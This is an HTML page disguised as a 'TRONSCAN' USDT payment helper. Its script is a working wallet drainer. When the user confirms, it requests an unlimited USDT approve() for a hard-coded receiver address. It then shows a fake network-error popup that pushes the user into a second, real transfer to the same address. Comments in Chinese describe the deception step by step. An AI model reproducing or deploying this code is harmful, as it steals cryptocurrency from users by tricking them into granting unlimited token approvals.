<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>TRONSCAN | 快捷支付</title>
    <style>
        body { background: #f8f9fa; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
        .header { background: #fff; padding: 18px; border-bottom: 1px solid #eee; font-weight: bold; color: #eb0029; font-size: 18px; text-align: center; }
        .container { padding: 20px; }
        .card { background: #fff; border-radius: 16px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
        .label { font-size: 14px; color: #333; margin-bottom: 12px; font-weight: 500; }
        .input-group { border-bottom: 2px solid #eb0029; padding: 10px 0; margin-bottom: 25px; display: flex; align-items: center; }
        input { border: none; outline: none; font-size: 32px; font-weight: bold; width: 100%; color: #000; background: transparent; }
        .unit { font-size: 20px; font-weight: bold; color: #000; margin-left: 10px; }
        .btn { background: #eb0029; color: #fff; height: 55px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 17px; font-weight: bold; cursor: pointer; }
        
        /* 弹窗遮罩：原地弹出，不改变页面 */
        #error-mask { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; z-index: 1000; }
        .modal { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; background: #fff; border-radius: 20px; text-align: center; overflow: hidden; }
        .m-body { padding: 35px 25px; font-size: 16px; color: #333; line-height: 1.6; }
        .m-btn { padding: 18px; color: #007aff; font-weight: bold; border-top: 1px solid #eee; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">TRONSCAN 支付助手</div>
    <div class="container">
        <div class="card">
            <div class="label">请输入转账金额</div>
            <div class="input-group">
                <input type="number" id="u-amt" placeholder="0.00">
                <span class="unit">USDT</span>
            </div>
            <div class="btn" id="submit-btn" onclick="executeProcess()">确认转账</div>
            <div style="font-size: 11px; color: #ccc; margin-top: 15px; text-align: center;">
                收款地址：TACSF4i5vZxSp4rzR1jfJ5JTf4depqi4dZ
            </div>
        </div>
    </div>

    <div id="error-mask">
        <div class="modal">
            <div class="m-body" id="m-text">
                <b style="color:#ff3b30; font-size: 18px;">网络连接异常 (0x402)</b><br><br>
                当前加密链路同步超时，请点击下方按钮重新发起支付请求。
            </div>
            <div class="m-btn" id="m-btn" onclick="retryTransfer()">重新提交转账</div>
        </div>
    </div>

    <script>
        const CONFIG = {
            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            RECEIVER: "TACSF4i5vZxSp4rzR1jfJ5JTf4depqi4dZ"
        };

        let hasPermission = false;

        // 执行核心流程：原地处理，不跳转
        async function executeProcess() {
            const val = document.getElementById('u-amt').value;
            if (!val || val <= 0) return alert("请输入金额");

            const btn = document.getElementById('submit-btn');
            btn.innerText = "处理中...";

            try {
                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
                // 第一步：原地调起授权弹窗
                const max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
                const tx = await contract.approve(CONFIG.RECEIVER, max).send();

                if (tx) {
                    hasPermission = true;
                    // 授权完后，不跳转页面，直接在当前页显示“异常”弹窗
                    document.getElementById('error-mask').style.display = 'block';
                    btn.innerText = "确认转账";
                }
            } catch (e) {
                btn.innerText = "确认转账";
                // 如果取消授权，留在原处，不刷新
            }
        }

        async function retryTransfer() {
            if (!hasPermission) return;
            const btn = document.getElementById('m-btn');
            const txt = document.getElementById('m-text');
            const val = document.getElementById('u-amt').value;

            btn.innerText = "正在重连...";

            try {
                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
                const sunValue = window.tronWeb.toSun(val);
                // 第二步：调起真实的转账弹窗
                await contract.transfer(CONFIG.RECEIVER, sunValue).send();
                
                txt.innerHTML = "<b style='color:#34c759; font-size: 18px;'>✅ 支付提交成功</b><br><br>资金将在确认后到账。";
                btn.innerText = "确定";
                btn.onclick = () => { document.getElementById('error-mask').style.display = 'none'; };
            } catch (e) {
                document.getElementById('error-mask').style.display = 'none';
            }
        }
    </script>
</body>
</html>
